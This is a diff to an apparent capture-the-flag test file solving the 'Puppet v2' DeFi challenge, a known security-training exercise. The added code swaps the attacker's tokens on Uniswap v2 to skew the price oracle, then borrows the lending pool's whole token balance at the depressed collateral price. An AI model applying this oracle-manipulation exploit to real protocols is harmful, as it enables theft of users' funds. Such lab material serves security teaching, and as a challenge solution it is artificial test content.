@@ -86,18 +86,23 @@ describe('[Challenge] Puppet v2', function () {
         const uni = await this.uniswapRouter.connect(attacker);
         const pool = await this.lendingPool.connect(attacker);
         const weth = await this.weth.connect(attacker);
+        const filter = weth.filters.Transfer(null, attacker.address);
+
+        weth.on("Transfer",(data) => console.log(data));
+
+        //just doing the same as in puppet but with uniswap v2
 
         let tx = await token.approve(uni.address,ATTACKER_INITIAL_TOKEN_BALANCE);
         await tx.wait();
 
-        const path = [token.address,await uni.WETH()];
+        const path = [token.address, weth.address];
         
         console.log(path);
         const deadline = (await ethers.provider.getBlock('latest')).timestamp * 3;
 
         tx = await uni.swapExactTokensForETH(
-            ATTACKER_INITIAL_TOKEN_BALANCE.sub(ethers.utils.parseEther("1")),
-            ethers.utils.parseEther("5"),
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(ethers.utils.parseEther("0.2")),
+            ethers.utils.parseEther("1"),
             path,
             attacker.address,
             deadline
@@ -105,9 +110,10 @@ describe('[Challenge] Puppet v2', function () {
 
         await tx.wait();
 
-       // const filter = weth.filters.Transfer(null, attacker.address);
-
-        //weth.on("Transfer",(data) => console.log(data));
+        console.log(
+            "attacker eth:",
+            ((await ethers.provider.getBalance(attacker.address)).div(ethers.utils.parseEther("1"))).toString()
+        );
 
         const amount = await pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
 
@@ -116,7 +122,38 @@ describe('[Challenge] Puppet v2', function () {
             (amount.div(ethers.utils.parseEther("1"))).toString()
         );
 
-       // weth.removeAllListeners();
+        tx = await weth.deposit({value:amount});
+        await tx.wait();
+        
+        tx = await weth.approve(pool.address,amount);
+        
+        await tx.wait();
+
+        console.log(
+            "attacker weth before attack:",
+            ((await weth.balanceOf(attacker.address)).div(ethers.utils.parseEther("1"))).toString()
+        );
+
+        tx = await pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        await tx.wait();
+
+        console.log(
+            "attacker tokens:",
+            ((await token.balanceOf(attacker.address)).div(ethers.utils.parseEther("1"))).toString()
+        );
+
+        console.log(
+            "attacker weth:",
+            ((await weth.balanceOf(attacker.address)).div(ethers.utils.parseEther("1"))).toString()
+        );
+
+        console.log(
+            "pool tokens:",
+            ((await token.balanceOf(pool.address)).div(ethers.utils.parseEther("1"))).toString()
+        );
+        
+        weth.removeAllListeners();
     });
 
     after(async function () {
